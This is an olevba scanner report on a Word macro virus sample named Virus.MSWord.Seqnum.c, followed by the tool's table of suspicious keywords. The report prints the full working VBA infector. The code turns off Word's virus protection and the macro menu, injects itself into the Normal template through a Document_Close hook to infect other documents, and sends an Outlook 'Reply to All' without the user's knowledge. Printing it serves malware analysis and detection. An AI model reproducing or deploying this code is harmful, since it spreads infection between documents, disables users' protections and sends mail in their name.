olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Seqnum.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Seqnum.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
hnetCmd.Enabled = True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    Set prevDocument = ActiveDocument
    Set nextDocument = NormalTemplate
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
CHL = NTI1.Properties.Item("ConsecutiveHyphensLimit").Value
If CHL > 800 Then
If ((CHL / 1000 + (CHL / 10 Mod 100)) Mod 10) = ((CHL / 100 Mod 10) + CHL Mod 10) Then GoTo Caught
Else
seqNum = 8602
hnetPath = Application.Path
hnetName = hnetPath & "\" & CStr(seqNum) & ".bas"
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
ADCL = ADI1.CodeModule.CountOfLines
moduleName = ADI1.Name
Open hnetName For Output Lock Read Write As #1
firstLine = "Attribute VB_Name = " & """" & moduleName & """"
Print #1, firstLine
i = 1
Do While ADI1.CodeModule.Lines(i, 1) <> ""
thisLine = ADI1.CodeModule.Lines(i, 1)
If thisLine = "seqNum = " & CStr(seqNum) Then
    a = Int(seqNum / 1000): b = Int(seqNum / 100) Mod 10: c = Int(seqNum / 10) Mod 10: d = seqNum Mod 10
    e = (a + b) Mod 10: f = (b + c) Mod 10: g = (c + d) Mod 10: h = (d + a) Mod 10
    newSeq = e * 1000 + f * 100 + g * 10 + h
    Print #1, "seqNum = " & CStr(newSeq)
Else
    Print #1, thisLine
End If
i = i + 1
Loop
Close #1
NTI1.Properties.Item("ConsecutiveHyphensLimit").Value = seqNum
NTCL = NTI1.CodeModule.CountOfLines
If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
NTI1.CodeModule.InsertLines 1, "Private Sub Document_Close()"
NTI1.CodeModule.InsertLines 2, "Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)"
NTI1.CodeModule.InsertLines 3, "ADCL = ADI1.CodeModule.CountOfLines"
NTI1.CodeModule.InsertLines 4, "If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL"
NTI1.CodeModule.InsertLines 5, "ADI1.CodeModule.AddFromFile (" & """" & hnetName & """" & ")"
NTI1.CodeModule.InsertLines 6, "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
NTI1.CodeModule.InsertLines 7, "ActiveDocument.Saved = True"
NTI1.CodeModule.InsertLines 8, "End Sub"
End If
Caught:
Dim hnetDays(0 To 4, 0 To 1) As String
hnetDays(0, 0) = "0101": hnetDays(0, 1) = "Happy New Year!"
hnetDays(1, 0) = "0214": hnetDays(1, 1) = "Acutally... I love you."
hnetDays(2, 0) = "1203": hnetDays(2, 1) = "Happy Birthday, hnet!"
hnetDays(3, 0) = "1225": hnetDays(3, 1) = "Merry Christmas!"
Dim hnetApp, hnetMapiName, hnetMailItem, hnetDefInbox, hnetMailReply
Dim hnetContactCount, hnetInboxCount As Long
Set hnetApp = CreateObject("Outlook.Application")
Set hnetMapiName = hnetApp.GetNamespace("MAPI")
hnetMapiName.Logon "profile", "password"
Set hnetinspector = hnetApp.ActiveInspector
Set hnetMailItem = hnetinspector.CurrentItem
Set hnetMailReply = hnetMailItem.Actions("Reply to All").Execute
hnetMailReply.Body = "OK! I got it, thanks."
For i = 0 To 3
If Day(Now) = CInt(Right(hnetDays(i, 0), 2)) And Month(Now) = CInt(Left(hnetDays(i, 0), 2)) Then
hnetMailReply.Body = hnetMailReply.Body & Chr(13) & Chr(10) & hnetDays(i, 1)
Exit For
End If
Next i
If i = 2 Then age = (Year(Now) - 1998)
hnetMailReply.Body = hnetMailReply.Body & Chr(13) & Chr(10) & "Let's celebrating your " & age & " year(s) old birthday!"
hnetMailReply.Body = hnetMailReply.Body & Chr(13) & Chr(10) & Application.UserName
peep = ""
hnetMailReply.Send
hnetMapiName.Logoff
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

